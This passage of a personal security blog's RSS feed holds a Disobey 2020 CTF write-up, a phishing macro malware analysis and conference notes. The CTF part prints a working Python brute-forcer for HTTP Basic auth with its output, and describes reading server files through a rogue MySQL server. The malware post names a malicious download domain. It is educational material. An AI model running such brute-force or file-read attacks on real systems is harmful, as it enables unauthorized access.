+</code></pre><p>Exiftool shows some interesting info about the photo. Comment has some URL on it and it has base64 after it.</p>
+<pre tabindex="0"><code> whois@cypher → ~/Disobey2020 → echo &quot;Q2FuJ3QgVG91Y2ggVGhpcw==&quot; |base64 -d
+Can't Touch This
+ whois@cypher → ~/Disobey2020 → curl https://db.0n.fi/
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;401 Authorization Required&lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor=&quot;white&quot;&gt;
+&lt;center&gt;&lt;h1&gt;401 Authorization Required&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre><p>Oh&hellip; It&rsquo;s hammer time&hellip; The site seems to be alive. HTTP 401 is telling us we need to authenticate first. As we already know some words, lets put them on the list and bruteforce!</p>
+<pre tabindex="0"><code> whois@cypher → ~/Disobey2020 → cat words.txt
+mehram
+hammer
+MEHRAM
+HAMMER
+Can't Touch This
+Q2FuJ3QgVG91Y2ggVGhpcw==
+</code></pre><p>I wrote a little python script for the bruteforce. It&rsquo;s not beautiful but it&rsquo;s working. But actually it&rsquo;s AI as it has multiple if statements&hellip; :D</p>
+<pre tabindex="0"><code> whois@cypher → ~/Disobey2020 → cat bruteforcer.py 
+import requests
+import sys
+import time
+
+filetoopen=sys.argv[1]
+
+with open(filetoopen,&quot;r&quot;) as usernames:
+  for l1 in usernames:
+    with open(filetoopen, &quot;r&quot;) as passwords:
+      for p1 in passwords:
+        username = l1.replace('\n', '')
+        password = p1.replace('\n', '')
+        while True:
+          r = requests.get(&quot;https://db.0n.fi/&quot;, auth=(username, password))
+          if(r.status_code==429):
+            time.sleep(1)
+            continue
+          if(r.status_code!=401):
+            print(&quot;[+] Working creds found: %s:%s&quot; % (username, password))
+            sys.exit(1)
+          if(r.status_code==401):
+            print(&quot;[-] Incorrect: %s:%s&quot; % (username, password))
+            break
+
+ whois@cypher → ~/Disobey2020 → python3 bruteforcer.py words.txt          
+[-] Incorrect: mehram:mehram
+[-] Incorrect: mehram:hammer
+[-] Incorrect: mehram:MEHRAM
+[-] Incorrect: mehram:HAMMER
+[-] Incorrect: mehram:Can't Touch This
+[-] Incorrect: mehram:Q2FuJ3QgVG91Y2ggVGhpcw==
+[-] Incorrect: hammer:mehram
+[-] Incorrect: hammer:hammer
+[-] Incorrect: hammer:MEHRAM
+[-] Incorrect: hammer:HAMMER
+[-] Incorrect: hammer:Can't Touch This
+[+] Working creds found: hammer:Q2FuJ3QgVG91Y2ggVGhpcw==
+</code></pre><p>And against all odds, we got working username:password combination. The base64 string said &ldquo;Can&rsquo;t Touch This&rdquo; which now totally makes sense as the encoded string was the password.</p>
+<h1 id="_dbfun">_dbfun</h1>
+<p>After we authenticate with Basic AUTH, we get to the some kind of db connect site.</p>
+<p><img src="/assets/images/db.png" alt="image"></p>
+<p>Clicking &ldquo;connect&rdquo; we get following error message:</p>
+<pre tabindex="0"><code>Connect failed, check hostname: php_network_getaddresses: getaddrinfo failed: Name or service not known
+</code></pre><p>Time to open BURP Suite and investigate the connection more&hellip; :) After setting up a foxyproxy, I intercepted the POST request which is send when you click &ldquo;CONNECT&rdquo; on the database connection site and sent it to repeater. Now I can edit the request and see how the endpoint reacts to my changes.</p>
+<p><img src="/assets/images/burp1.png" alt="image"></p>
+<p>As the error message says &ldquo;check hostname&rdquo;, we decided to try and give the server hostname as a parameter. Sending &ldquo;hostname=127.0.0.1&rdquo; seemed to work as we got new error message&hellip;</p>
+<p><img src="/assets/images/burp2.png" alt="image"></p>
+<p>Next we wanted to see if we could make the server to contact my own server. I set up an server for this purpose only to DigitalOcean. As a lazy man, installing databases is too time consuming so I decided to use netcat.</p>
+<p><img src="/assets/images/burp3.png" alt="image"></p>
+<p><img src="/assets/images/digitalocean1.png" alt="image"></p>
+<p>We got a connection from the server!! Super. Now we just need to figure out what to do next.</p>
+<p>At this point I remembered reading from <a href="https://www.vesiluoma.com/abusing-mysql-clients/">Jarkko Vesiluoma&rsquo;s blog</a> about LFI (Local File Inclusion) in MySQL client. After re-reading it and googling a round little, I managed to find this rogue <a href="https://raw.githubusercontent.com/Gifts/Rogue-MySql-Server/master/rogue_mysql_server.py">MySQL server script</a> from GitHub, which should do the needfull for us. I set it up to my DigitalOcean server and happily saw that we got /etc/passwd as a response from db.0n.fi !!!!</p>
+<p><img src="/assets/images/digitalocean2.png" alt="image"></p>
+<p>We started reading all files from the server. Finally we ended up checking index.php and found the following:</p>
+<p><img src="/assets/images/digitalocean3.png" alt="image"></p>
+<p>It&rsquo;s there: <a href="https://holvi.com/shop/Disobey/product/8df92c434d4e765189d54dda5736e3c3">https://holvi.com/shop/Disobey/product/8df92c434d4e765189d54dda5736e3c3</a></p>
+<p>We got the ticket link and finished 1st (well 1st, 2nd and 3rd) in the race.. :)</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This year the hacker badge challenge was IMHO harder than last year. I think I learned a lot on the journey even though there wasn&rsquo;t anything mind blowing. I liek&rsquo;d reverse part the most. Thanks for all who were involved in making the challenge and my team mates (Dist &amp; Jaroneko) who shared the mental break down during the via dolorosa&hellip; See you all in Disobey!</p>
+<p>P.S. If you have something to ask/comment about this writeup, please contact me on <a href="https://twitter.com/JuhoJauhiainen">Twitter</a>.</p>
+]]></content></item><item><title>[0x02] Late wedding gift</title><link>https://who1s.github.io/posts/2019/07/0x02-late-wedding-gift/</link><pubDate>Sun, 07 Jul 2019 18:46:00 +0000</pubDate><guid>https://who1s.github.io/posts/2019/07/0x02-late-wedding-gift/</guid><description>This is kinda old story but I wanted to share it with you as I find it somewhat funny. Sadly now, when I finally had spare time to spend with the document, the host it tries to connect is down. Hopefully you still enjoy the read!
+Me and my wife got married 1,5 years ago in Las Vegas. As usual, I had to confirm the reservation by sending an email to the chapel.</description><content type="html"><![CDATA[<p><img src="/assets/special_memory.jpg" alt="Me and my wife"></p>
+<blockquote>
+<p>This is kinda old story but I wanted to share it with you as I find it somewhat funny. Sadly now, when I finally had spare time to spend with the document, the host it tries to connect is down. Hopefully you still enjoy the read!</p>
+</blockquote>
+<p>Me and my wife got married 1,5 years ago in Las Vegas. As usual, I had to confirm the reservation by sending an email to the chapel. Everything went fine and the wedding session was good. Few months after the wedding trip, I got unexpected reply email from the chapel with somewhat suspicious attachment. The sender used the same signature than the legit clerk used before. Only the email address in the signature was different. Also, the address the email software rendered was different but it was still in the same legit domain.</p>
+<p><img src="/assets/email.png" alt="Email reply"></p>
+<p>Email headers proved that the actual sender wasn&rsquo;t from the chapel. The X-Sender-ID revealed that the sender was user called &ldquo;jreid&rdquo; from a domain, which is owned by an another Las Vegas based company. As the email wasn&rsquo;t actually from the chapel, it was certain their email was compromised somehow as the suspicious car dealer was able to reply my wedding reservation with suspicious file called “Inquiry.doc”.</p>
+<p><img src="/assets/headers.png" alt="Headers"></p>
+<p>At the time I got the document, it wasn&rsquo;t yet in the Virustotal but someone uploaded it there right after, which incidates that I was just a victim of a bigger campaign. As shown below, when the document was uploaded only 11/59 AVs detected it was malicious. Nowadays the detection rate is much higher in <a href="https://www.virustotal.com/gui/file/e67bbba2163b17a3f3463cd89ab4a0158be4bd913fa9931286bebd5738564816/detection">Virustotal</a>.</p>
+<p><img src="/assets/vt.png" alt="Virustotal"></p>
+<p>I took the document to my analysis machine and started digging into it. Visualization of the document isn&rsquo;t that special: O365 reproduction just like every second phishing email around there asking me to enable macros. As the document wanted me to enable macros I decided to look at it on my <a href="https://remnux.org/">REMnux</a> machine.</p>
+<p><img src="/assets/document.png" alt="Document"></p>
+<p>I ran olevba from <a href="https://github.com/decalage2/oletools/">oletools</a> against the document and saw that it had some common obfuscations methods along with risky functions that run macros when the document is opened. As we later see, the methods olevba recommends us to use in deobfuscation  won&rsquo;t help in this case.</p>
+<p><img src="/assets/olevba.png" alt="Olevba"></p>
+<p>I dumped macros out of the document with oledump. As seen below, the macros were located in objects 14 and 15 and named as “nmDRCwbHKQjsrP” and &ldquo;uwzNTowafnEB&rdquo;. After dumping the both, I noticed they were kinda fuzzy looking and filled with probably unnecessary commands.</p>
+<p><img src="/assets/all_macros.png" alt="Olevba"></p>
+<p><img src="/assets/macro14.png" alt="nmDRCwbHKQjsrP"></p>
+<p><img src="/assets/macro15.png" alt="uwzNTowafnEB"></p>
+<p>As I am kinda lazy person, I decided to give behavioural analysis a try before starting staticly to deobfuscate found macros. I started <a href="https://www.inetsim.org/">InetSim</a> and <a href="https://github.com/Crypt0s/FakeDns">fakedns</a> on my REMnux machine and ran the document content (macros) on the Windows 10 malware analysis machine. The machine I am using has been setupped by myself with the tools I use the most on forensics analysis.</p>
+<p>When I opened the document, I had Powershell <a href="https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/">transcript logging</a> enabled and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> running on the Windows machine. After I opened the document, I saw that my Win machine tried to resolve domain “kklajsdjqwneb.com” and then download file called “kapkap2.yarn” from URL in the domain. The first screenshot below is from fakedns and the latter one from InetSim service log.</p>
+<p><img src="/assets/fakedns.png" alt="FakeDNS output"></p>
+<p><img src="/assets/inetsim.png" alt="InetSim"></p>
+<p>At this point, I was already able to deduce that the document was acting as a downloader. It tries to downlaod something from the web without user&rsquo;s aknowledge. When I opened the Process Monitor log with ProcDot, I saw that the script had also created a file called &ldquo;16329.exe&rdquo; on a disk. As I viewed the file with BinText, it was the InetSim fake website which was returned when the script requested previously mentioned “kapkap2.yarn” file. Powershell transcript log also proved that the script tried to execute the downloaded file but failed as the InetSim returned HTML instead of Windows executable.</p>
+<p>As the number in the executable name seemed quite random, I wanted to make sure how the script named the executable. If the naming rule is static, it could potentially be used as an IOC (Indicator of Compromise) along with already gathered domain name and filename (kapkap2.yarn). Based on my experience, it is always good to check executables located in %PUBLIC directory. I have seen so many times an attacker &ldquo;hiding&rdquo; her malicious stuff in  &ldquo;C:\Users\Public&rdquo;&hellip;</p>
+<p><img src="/assets/procdot.png" alt="Created file"></p>
+<p>As I wanted to know how the path to the executable was created, I needed to deobfuscate that ugly looking VBA macro. To do that, I decided to grep out all the unnecassary CDate-commands and write a python script which prints out the actualy non-gibberish from the macro. As the macro in object 15 was longer, I started with that. My script printed me the output and I was able to see that it was likely launch command for powershell eventhough the letter &ldquo;p&rdquo; was missing from the beginning. The actual powershell command was base64 encoded.</p>
+<p><img src="/assets/deobfuscatingscript.png" alt="Created file"></p>
+<p>I decided to decode the base64 to understand better, what was the powershell calling. Decoding revealed another layer of obfuscation, which looked kinda time consuming to deobfuscate manually.</p>
+<p><img src="/assets/obfuscated.png" alt="More obfuscation"></p>
+<p>My Windows 10 machine had <a href="https://github.com/R3MRUM/PSDecode">PSDecode-module</a> installed so I decided to give it a try. The tool was able to deobfuscate remaining part and reveal that the script first randomly creates the variable which is latter used to name the executable. After creating the random variable, it connects to previously mentioned URL and downloads the “kapkap2.yarn” file. Then the file is stored to “C:\Users\Public” using environment variable “%public”. For some reason, the actual file download is made with a for-loop even though the variable/array has only one value. Every iteration of for loop also tries to run the file after download.</p>
+<p><img src="/assets/decoded_powershell.png" alt="Decoded powershell"></p>
+<p>The macro in object 14 seems to be the actual “launcher” for the macro as it has following functions:</p>
+<ol>
+<li>Build the powershell command from object 15 with variable uikCp, then uses function BuTCRz() to place the variable to imjkIoN, which is later on called with the command Shell()</li>
+<li>Run macros when the document is opened with Autoopen()</li>
+<li>Add character P before the object 15 macro with Chr(vbKeyP)</li>
+<li>Execute previously build powershell command from object 15 with Shell()</li>
+<li>Hide the execution from user with vbhide</li>
+</ol>
+<p><img src="/assets/object14.png" alt="Created file"></p>
+<p>It would had been interesting to analyze the binary which the document tried to download. Analysis of the downloaded binary would had most likely revealed the actual target of this phish campaign. Anyhow, I think distributing malware this way (e.g. replyng to emails from compromised mailbox) is efficient as users already have relationship of trust with the sender. As they already know the sender, distinguishing if the file is malicious might be too hard for a regular user.</p>
+]]></content></item><item><title>[0x01] SANS 2019 &amp; BSides Orlando</title><link>https://who1s.github.io/posts/2019/04/0x01-sans-2019-bsides-orlando/</link><pubDate>Thu, 18 Apr 2019 09:00:00 +0000</pubDate><guid>https://who1s.github.io/posts/2019/04/0x01-sans-2019-bsides-orlando/</guid><description>Few weeks ago I left cold Finland and headed to Orlando to attend SANS FOR610 (Reverse-Engineering Malware). After signing up and buying flight tickets, I noticed that BSides Orlando was held just few days before the course started. I though &amp;ldquo;What the hell&amp;rdquo; and bought a ticket to that event as well. BSides is Disobey (Finnish hacking/cyber security event) like event and has talks, workshops, CTF, soldering station etc&amp;hellip;
+BSides was held at Full Sail University near Orlando.</description><content type="html"><![CDATA[<p><img src="/assets/IMG_9079.JPG" alt="Bsides Orlando"></p>
+<p>Few weeks ago I left cold Finland and headed to Orlando to attend SANS FOR610 (Reverse-Engineering Malware). After signing up and buying flight tickets, I noticed that BSides Orlando was held just few days before the course started. I though &ldquo;What the hell&rdquo; and bought a ticket to that event as well. BSides is <a href="https://disobey.fi">Disobey</a> (Finnish hacking/cyber security event) like event and has talks, workshops, CTF, soldering station etc&hellip;</p>
+<p>BSides was held at Full Sail University near Orlando. I arrived around 8:30 AM and the queue was really long already. Finally, around 9:15 AM, I managed to get in and see <a href="https://twitter.com/IanColdwater">Ian Coldwater&rsquo;s</a> keynote about DevSecOps. The talk was fun and I found out that Ian thinks that the root cause of poor software security is lack of communication between developers and the security folks. After the keynote, I decided to go and see <a href="https://twitter.com/therealwlambert">Wes Lambert&rsquo;s</a> talk Panning for Gold(en Artifacts). The talk was about <a href="https://github.com/Illumina/strelka">Strelka</a> and <a href="https://securityonion.net/">Security Onion</a> and how to use them in real-time file analysis on networks.</p>
+<p>After the first two talks, I spent some time playing the CTF. CTF was kinda typical and had various categories. I worked two tasks under the scripting skills-tag and they were quite fun. I would have loved to spend more time playing the CTF but I wanted to see Office 365 Incident Response talk by <a href="https://twitter.com/ParsonsProject">Alex Parsons</a>. This was my favourite talk in the event - I got pretty neat tool tricks to take home and try out in real world scenarios. For example the tool <a href="https://github.com/Canthv0/hawk">HAWK</a> to gather O365 logs for forensic examination.</p>
+<p>The last talk I saw before I had to leave the venue was &ldquo;What We Do In the Shadows&rdquo; by Timothy Kusajtys. The talk was about OPSEC and turned out to be really funny. The level of OSPEC and tin foil in this presentation was quite high and maybe little too much for me&hellip; The event also had workshops and a soldering station where you were able to attach screens and stuff to your badge which I did not have time to attend.</p>
+<p>For all thinking if they should attend BSides: You should. I would not recommend to travel anywhere only for that but if you are around at the time, it is definitely worth of attending. Great talks, great things to do, great fun!</p>
+<p><img src="/assets/bookz.jpg" alt="FOR610 Course material"></p>
+<p>After BSides, I attended SANS 2019-event and FOR610 by <a href="https://twitter.com/lennyzeltser">Lenny Zeltser</a>. SANS FOR610 is a course which &ldquo;explores malware analysis tools and techniques in depth&rdquo;. Lenny is an author of the course so I felt really excited him being the teacher.</p>
+<p>The course week was brutal&hellip; Lot of assembly from Monday to Friday from 9:00 AM to 5:30 PM. As this was my third SANS course, I already knew that the week is going to be heavy and I decided not to go to bonus talks held in the evening through Monday to Wednesday. Instead of seeing bonus talks, I spent evenings to iterate topics of the day especially as I did not feel comfortable with my assembly &ldquo;skills&rdquo; when the course started. The course material was really good and easy to follow. The labs dealt the daily course topics and the material was super interesting. Of course, I might be biased to say as I am highly interested getting into analyzing malware.</p>
+<p>The sixth day of the course was individual CTF competition, where we were given a batch of malware for analysis. The CTF had modules of multiple questions on three different levels. To answer the questions, you either had to debug the malware, disassemble it and analyze the code or do behavior analysis by running the malware. I felt the most confident working with IDA so I focussed on the questions which required disassembling and static reversing. My strategy worked quite well as the questions were worth of big scores and I ended up winning the REM challenge coin by finishing 4th!!!</p>
+<p>The course was super and Lenny was great teacher! Here&rsquo;s a picture of me and him after the CTF competition. Thanks again Lenny!</p>
+<p><img src="/assets/IMG_9243.JPG" alt="Lenny and a fanboy"></p>
+<p>Albeit I wanted to focus on the FOR610 course, I decided to play DFIR NetWars on Thursday and Friday evenings. SANS describes DFIR NetWars as following: &ldquo;DFIR NetWars is an incident simulator packed with a vast amount of forensic, malware analysis, threat hunting, and incident response challenges designed to help you gain proficiency without the risk associated when working real life incidents&rdquo;. In a nutshell, we were given 60 Gigs of forensic evidence and bunch of questions on what had happened. The competition started on Thursday around 6:30 PM and pause at 10:00 PM. Of course, as the evidence was given to us, we were able to process the data all night long. I started really well in the competition and I was leading the competition after one hour of playing. As I wasn&rsquo;t that familiar with iOS, Android and Mac OS forensics, I started to struggle. I didn&rsquo;t have a clue what is the best practice to do forensic examination on these operating systems so I decided to write a little python script, that parses SQLite and plist files to single CSV during the competition. After this, I was able to grep stuff out of the CSV. :D At the time the game paused, I was 3rd and decided to continue working on the evidence all night long.</p>
+<p><img src="/assets/IMG_9200.JPG" alt="DFIR NetWars scoreboard after the first night"></p>
+<p>Next day the DFIR NetWars continued around 6:30 PM. I started to submit answers I found during the night. After I had finished submitting, I was happy to see I was 2nd. After 20 minutes or so, I noticed that everyone else also seemed to have worked all night and I started falling down the scoreboard. As I was feeling quite tired, I couldn&rsquo;t extort myself and spurt back to the scoreboard. The scoreboard got hidden 30 minutes before the game closed and at the time, I was 5th which is the last place, who would win the NetWars coin. I did get few points before the game closed and when the scoreboard was revealed, I was 6th individual which basically means I was the first one who doesn&rsquo;t get the coin&hellip; I felt quite pissed as my score was just two points below the next individual and before the 30 minute blackout, I was significantly ahead of the next individual&hellip; Lucky for me, the 5th player did forfeit after declaration of result and I was promoted to 5th place.</p>
+<p>The DFIR NetWars experience was great and I can definitely recommend it to everyone, who is working in DFIR. Can&rsquo;t wait to participate in other NetWars competitions as well someday.</p>
+<p><img src="/assets/IMG_9349.JPG" alt="Lethal forensicator coins"></p>
+]]></content></item><item><title>[0x00] Hello World!</title><link>https://who1s.github.io/posts/2019/04/0x00-hello-world/</link><pubDate>Sun, 14 Apr 2019 13:00:00 +0000</pubDate><guid>https://who1s.github.io/posts/2019/04/0x00-hello-world/</guid><description>I decided to start blogging because
+I suck at remembering stuff -&amp;gt; If I write it publicly down, I will most likely remember it There&amp;rsquo;s no DFIR blogs in Finland (at least I don&amp;rsquo;t know of them) There&amp;rsquo;s never too many projects, right? My bio can be found on about-page</description><content type="html"><![CDATA[<p>I decided to start blogging because</p>
+<ol>
+<li>I suck at remembering stuff -&gt; If I write it publicly down, I will most likely remember it</li>
+<li>There&rsquo;s no DFIR blogs in Finland (at least I don&rsquo;t know of them)</li>
+<li>There&rsquo;s never too many projects, right?</li>
+</ol>
+<p>My bio can be found on <a href="/about">about-page</a></p>
+]]></content></item></channel></rss>
